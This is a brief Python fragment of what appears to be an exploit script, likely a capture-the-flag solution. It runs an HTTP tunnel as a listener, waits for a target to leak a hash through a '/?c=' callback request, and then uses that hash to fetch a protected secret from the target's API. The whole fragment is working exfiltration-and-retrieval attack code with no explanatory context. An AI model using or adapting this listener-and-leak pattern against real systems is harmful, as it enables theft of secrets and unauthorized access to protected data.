...
leaked_hash = '76ccec94252b1a47c3b75a50c9c156'  # bf
while True:
    with tunnel.open_http_tunnel(tls=True) as t:
        ...
        print('Waiting for the leak...')

        _, path, _, _ = t.wait_request()
        t.send_response(200, {'Content-Type': 'text/html'}, "OK".encode())
        assert path.startswith('/?c=')
        leaked_hash = path[4:]
        print('Got leak', leaked_hash)

        if len(leaked_hash) == 32:
            break

print(f'Leaked hash: {leaked_hash}')

r = s.get(f"{URL}/api/secret/{leaked_hash}", auth=('user', app_password))
print(r.text)
